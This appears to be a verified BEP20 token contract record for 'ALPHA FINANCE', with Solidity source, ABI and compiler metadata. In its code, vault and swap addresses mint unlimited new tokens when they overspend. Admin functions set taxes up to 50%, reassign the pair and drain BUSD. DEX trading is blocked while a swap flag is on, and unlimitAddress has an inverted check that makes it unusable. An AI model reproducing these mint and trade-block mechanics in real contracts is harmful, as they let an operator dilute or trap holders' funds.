{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-05-17\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2022-12-16\r\n*/\r\n\r\n/*\r\n SPDX-License-Identifier: None\r\n */\r\n\r\npragma solidity > 0.8.18;\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IDEXFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}\r\ninterface IDEXPair {function sync() external;}\r\ninterface IDEXRouter {function factory() external pure returns (address);}\r\n\r\ncontract ALPHA_TOKEN is IBEP20 {\r\n    string private constant _name = \"ALPHA FINANCE\";\r\n    string private constant _symbol = \"ALPHA\";\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private _totalSupply = 1_000_000 * (10**_decimals);\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) public limitless;\r\n    mapping(address => bool) public taxFreeWallet;\r\n    mapping(address => bool) public isVault;\r\n\r\n    uint256 public liqTax = 2;\r\n    uint256 public vaultTax = 8;\r\n    bool public swapActive = true;\r\n\r\n    IDEXRouter public constant ROUTER = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);//0x10ED43C718714eb63d5aA57B78B54704E256024E //0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3\r\n    address public CEO = 0xB7B7fdffd5B4c0905db7b53fF910Ff27A19Dd92b;// admin testnet - 0x4816fEC583401c2117e924dC95BF21d37819FbD0\r\n    address private constant BUSD = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;//busd testnet - 0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814 //usdc mainnet - 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d\r\n\r\n    address public treasury;\r\n    address public swap;\r\n    address public vault;\r\n    address public pair;\r\n\r\n    modifier onlyAdmin(){\r\n        require (msg.sender == CEO, \"Only the CEO can do that\");\r\n        _;\r\n    }\r\n\r\n    event VaultAddressChanged(address vault);\r\n    event VaultRemoved(address vaultAddress);\r\n    event VaultAdded(address vaultAddress);\r\n    event TaxStatusOfWalletSet(address wallet, bool status);\r\n    event TreasuryAddressChanged(address treasury);\r\n    event AlphaSwapAddressChanged(address alphaSwapAddress);\r\n    event TaxesChanged(uint256 liq, uint256 vault);\r\n    event NewLimitlessAddress(address limitlessAddress);\r\n    event NewLimitedAddress(address limitedAddress);\r\n    event SwapToppedUp(uint256 howMuchWasMissing);\r\n    event VaultToppedUp(address vaultAddress, uint256 howMuchWasMissing);\r\n    event TokensSentToTreasury(address tokenRescued, uint256 amountRescued);\r\n    event SwapStatusSet(bool active);\r\n    event BnbRescued();\r\n\r\n    constructor() {\r\n        pair = IDEXFactory(ROUTER.factory()).createPair(BUSD, address(this));\r\n        require(address(pair) != address(0), \"Pair creation failed.\");\r\n        _allowances[address(this)][address(ROUTER)] = type(uint256).max;\r\n\r\n        limitless[CEO] = true;\r\n        limitless[address(this)] = true;\r\n\r\n        _balances[CEO] = _totalSupply;\r\n        emit Transfer(address(0), CEO, _totalSupply);\r\n    }\r\n\r\n    function name() public pure override returns (string memory) {return _name;}\r\n    function totalSupply() public view override returns (uint256) {return _totalSupply;}\r\n    function decimals() public pure override returns (uint8) {return _decimals;}\r\n    function symbol() public pure override returns (string memory) {return _symbol;}\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n    function allowance(address holder, address spender) public view override returns (uint256) {return _allowances[holder][spender];}\r\n    function approveMax(address spender) external returns (bool) {return approve(spender, type(uint256).max);}\r\n    \r\n    function approveAllAlpha() external {\r\n        approve(swap, type(uint256).max);\r\n        approve(vault, type(uint256).max);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        require(spender != address(0), \"Can't use zero address here\");\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        require(spender != address(0), \"Can't use zero address here\");\r\n        _allowances[msg.sender][spender]  = allowance(msg.sender, spender) + addedValue;\r\n        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        require(spender != address(0), \"Can't use zero address here\");\r\n        require(allowance(msg.sender, spender) >= subtractedValue, \"Can't subtract more than current allowance\");\r\n        _allowances[msg.sender][spender]  = allowance(msg.sender, spender) - subtractedValue;\r\n        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);\r\n        return true;\r\n    }\r\n    \r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount ) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            require(_allowances[sender][msg.sender] >= amount, \"Insufficient Allowance\");\r\n            _allowances[sender][msg.sender] -= amount;\r\n            emit Approval(sender, msg.sender, _allowances[sender][msg.sender]);\r\n        }\r\n        \r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0) && recipient != address(0), \"Can't use zero addresses here\");\r\n        if(amount == 0) return true;\r\n        \r\n        if (limitless[sender] || limitless[recipient]) return _transfer(sender, recipient, amount);\r\n        \r\n        if(sender == pair || recipient == pair) {\r\n            require(swapActive==false, \"Please use AlphaSwap\");\r\n            amount = takeTax(sender, amount);\r\n            return _transfer(sender, recipient, amount);\r\n        }\r\n\r\n        bool taxFree;\r\n        if (taxFreeWallet[sender] || taxFreeWallet[recipient]) taxFree = true;\r\n\r\n        amount = taxFree ? amount : takeTax(sender, amount);\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function takeTax(address sender, uint256 amount) internal returns (uint256){\r\n        _transfer(sender, pair, amount * liqTax / 100);\r\n        IDEXPair(pair).sync();\r\n        _transfer(sender, vault, amount * vaultTax / 100);\r\n        return amount * (100 - vaultTax - liqTax) / 100;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if(isVault[sender] && amount > _balances[sender]) _vaultTopUp(sender, amount);\r\n        if(sender == swap && amount > _balances[swap]) _swapTopUp(amount);\r\n        require(amount <= _balances[sender], \"Can't transfer more than you own\");\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _swapTopUp(uint256 amountNeeded) internal {\r\n        uint256 howMuchIsMissing = amountNeeded - _balances[swap];\r\n        _balances[swap] += howMuchIsMissing;\r\n        _totalSupply += howMuchIsMissing;\r\n        emit SwapToppedUp(howMuchIsMissing);\r\n    }\r\n\r\n    function _vaultTopUp(address vaultAddress, uint256 amountNeeded) internal {\r\n        uint256 howMuchIsMissing = amountNeeded - _balances[vaultAddress];\r\n        _balances[vaultAddress] += howMuchIsMissing;\r\n        _totalSupply += howMuchIsMissing;\r\n        emit VaultToppedUp(vaultAddress, howMuchIsMissing);\r\n    }\r\n\r\n    function setTreasury(address treasuryAddress) external onlyAdmin {\r\n        require(treasury != treasuryAddress, \"Treasury is already set to this address\");\r\n        require(treasuryAddress != address(0), \"Can't use zero addresses here\");\r\n        treasury = treasuryAddress;\r\n        limitless[treasury] = true;\r\n        emit NewLimitlessAddress(treasury);\r\n        emit TreasuryAddressChanged(treasury);\r\n    }\r\n    \r\n    function setVault(address vaultAddress) external onlyAdmin {\r\n        require(vault != vaultAddress, \"Vault is already set to this address\");\r\n        require(vaultAddress != address(0), \"Can't use zero addresses here\");\r\n        isVault[vault] = false;\r\n        emit VaultRemoved(vault);\r\n        vault = vaultAddress;\r\n        isVault[vault] = true;\r\n        limitless[vault] = true;\r\n        emit NewLimitlessAddress(vault);\r\n        emit VaultAdded(vaultAddress);\r\n        emit VaultAddressChanged(vault);\r\n    }\r\n\r\n    function setSwapWallet(address alphaSwapAddress) external onlyAdmin {\r\n        require(alphaSwapAddress != address(0), \"Can't use zero addresses here\");\r\n        swap = alphaSwapAddress;\r\n        limitless[swap] = true;\r\n        emit NewLimitlessAddress(swap);\r\n        emit AlphaSwapAddressChanged(swap);\r\n    }\r\n\r\n    function setPairWallet(address alphaPairAddress) external onlyAdmin {\r\n        require(alphaPairAddress != address(0), \"Can't use zero addresses here\");\r\n        pair = alphaPairAddress;\r\n        \r\n    }\r\n\r\n    function updateVault(address vaultAddress) external onlyAdmin {\r\n        require(!isVault[vaultAddress], \"Address is already set as vault\");\r\n        require(vaultAddress != address(0), \"Can't use zero addresses here\");\r\n        isVault[vaultAddress] = true;\r\n        emit VaultAdded(vaultAddress);\r\n    }\r\n\r\n    function deleteVault(address vaultAddress) external onlyAdmin {\r\n        require(isVault[vaultAddress], \"Address is not a vault\");\r\n        require(vaultAddress != address(0), \"Can't use zero addresses here\");\r\n        isVault[vaultAddress] = false;\r\n        emit VaultRemoved(vaultAddress);\r\n    }\r\n\r\n    function withdrawToTreasury(address tokenToRescue) external onlyAdmin {\r\n        emit TokensSentToTreasury(tokenToRescue, IBEP20(tokenToRescue).balanceOf(address(this)));\r\n        require(IBEP20(tokenToRescue).transfer(treasury, IBEP20(tokenToRescue).balanceOf(address(this))),\"Token transfer failed\");\r\n    }\r\n\r\n    function withdraw_busd (uint amount, address _addr) external onlyAdmin {\r\n        IBEP20(BUSD).transfer(_addr, amount);\r\n    }\r\n\r\n    function recoverBnb() external onlyAdmin {\r\n        (bool success,) = address(treasury).call{value: address(this).balance}(\"\");\r\n        require(success, \"RescueBnb failed!\");\r\n        emit BnbRescued();\r\n    }\r\n\r\n    function setTaxes(uint256 newLiqTax, uint256 newVaultTax) external onlyAdmin {\r\n        liqTax = newLiqTax;\r\n        vaultTax = newVaultTax;\r\n        require(liqTax + vaultTax <= 50, \"Taxes can't exceed 50%\");\r\n        emit TaxesChanged(liqTax, vaultTax);\r\n    }\r\n\r\n    function setTaxFreeWallet(address wallet, bool status) external onlyAdmin {\r\n        require(taxFreeWallet[wallet] != status, \"Desired status already in effect\");\r\n        taxFreeWallet[wallet] = status;\r\n        emit TaxStatusOfWalletSet(wallet, status);\r\n    }\r\n\r\n    function unlimitAddress(address addressThatShouldBeLimitless) external onlyAdmin {\r\n        require(limitless[addressThatShouldBeLimitless], \"Address is already limitless\");\r\n        limitless[addressThatShouldBeLimitless] = true;\r\n        emit NewLimitlessAddress(addressThatShouldBeLimitless);\r\n    }\r\n\r\n    function limitWallet(address addressThatShouldBeLimited) external onlyAdmin {\r\n        require(!limitless[addressThatShouldBeLimited], \"Address is already limited\");\r\n        limitless[addressThatShouldBeLimited] = false;\r\n        emit NewLimitedAddress(addressThatShouldBeLimited);\r\n    }\r\n\r\n    function updateSwap(bool active) external onlyAdmin {\r\n        require(swapActive != active, \"Desired status already in effect\");\r\n        swapActive = active;\r\n        emit SwapStatusSet(active);\r\n    }\r\n\r\n    function changeCEO(address _CEO) external onlyAdmin{\r\n        CEO = _CEO;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"alphaSwapAddress\",\"type\":\"address\"}],\"name\":\"AlphaSwapAddressChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"BnbRescued\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"limitedAddress\",\"type\":\"address\"}],\"name\":\"NewLimitedAddress\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"limitlessAddress\",\"type\":\"address\"}],\"name\":\"NewLimitlessAddress\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"SwapStatusSet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"howMuchWasMissing\",\"type\":\"uint256\"}],\"name\":\"SwapToppedUp\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"TaxStatusOfWalletSet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"liq\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"vault\",\"type\":\"uint256\"}],\"name\":\"TaxesChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenRescued\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountRescued\",\"type\":\"uint256\"}],\"name\":\"TokensSentToTreasury\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"treasury\",\"type\":\"address\"}],\"name\":\"TreasuryAddressChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"name\":\"VaultAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"vault\",\"type\":\"address\"}],\"name\":\"VaultAddressChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"name\":\"VaultRemoved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"howMuchWasMissing\",\"type\":\"uint256\"}],\"name\":\"VaultToppedUp\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"CEO\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ROUTER\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"approveAllAlpha\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_CEO\",\"type\":\"address\"}],\"name\":\"changeCEO\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"name\":\"deleteVault\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isVault\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addressThatShouldBeLimited\",\"type\":\"address\"}],\"name\":\"limitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitless\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liqTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverBnb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"alphaPairAddress\",\"type\":\"address\"}],\"name\":\"setPairWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"alphaSwapAddress\",\"type\":\"address\"}],\"name\":\"setSwapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setTaxFreeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiqTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newVaultTax\",\"type\":\"uint256\"}],\"name\":\"setTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"treasuryAddress\",\"type\":\"address\"}],\"name\":\"setTreasury\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"name\":\"setVault\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"taxFreeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"treasury\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addressThatShouldBeLimitless\",\"type\":\"address\"}],\"name\":\"unlimitAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"updateSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"name\":\"updateVault\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vaultTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToRescue\",\"type\":\"address\"}],\"name\":\"withdrawToTreasury\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"withdraw_busd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ALPHA_TOKEN", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dc5ef81ea92668564360442728095668b6d82432598ff0886e3f12e2695a14bc"}